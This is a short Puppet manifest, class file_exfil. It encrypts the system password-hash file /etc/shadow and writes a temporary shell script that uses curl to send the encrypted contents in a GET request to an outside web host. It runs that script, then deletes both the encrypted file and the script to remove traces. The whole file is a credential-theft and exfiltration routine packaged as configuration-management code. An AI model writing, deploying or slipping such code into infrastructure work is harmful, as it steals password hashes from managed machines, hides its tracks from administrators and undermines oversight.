class file_exfil {


  # Encrypt the file using the function. It must exist.
  exec { 'encrypt_file':
    command => file_exfil::encrypt_file('/etc/shadow'),
    path    => ['/usr/bin', '/bin'],
  }

  # Create a temporary bash script to send encrypted file contents via GET
  file { '/tmp/send_encrypted_file.sh':
    ensure  => file,
    mode    => '0755',
    content => "#!/bin/sh
curl -X GET 'https://tommacdonald.co.uk/fileupload?data='$(cat /tmp/encrypted_file.txt | tr -d '\n')",
    require => Exec['encrypt_file'],
  }

  # Run the script to send the encrypted file
  exec { 'send_encrypted_file':
    command => '/bin/sh /tmp/send_encrypted_file.sh',
    path    => ['/usr/bin', '/bin'],
    timeout => 30,
    require => File['/tmp/send_encrypted_file.sh'],
  }

  # Explicitly remove the encrypted file after transmission
  exec { 'cleanup_encrypted_file':
    command => 'rm -f /tmp/encrypted_file.txt',
    path    => ['/usr/bin', '/bin'],
    require => Exec['send_encrypted_file'],
  }

  # Explicitly remove the temporary script after execution
  exec { 'cleanup_send_script':
    command => 'rm -f /tmp/send_encrypted_file.sh',
    path    => ['/usr/bin', '/bin'],
    require => Exec['cleanup_encrypted_file'],
  }
}
